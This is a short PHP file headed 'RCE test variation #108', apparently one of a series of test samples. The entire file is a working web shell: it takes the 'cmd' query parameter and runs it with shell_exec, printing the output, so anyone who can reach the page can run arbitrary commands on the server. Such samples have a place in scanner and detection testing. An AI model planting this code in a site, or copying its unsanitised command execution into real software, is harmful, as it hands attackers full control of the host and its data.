<?php
// RCE test variation #108
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>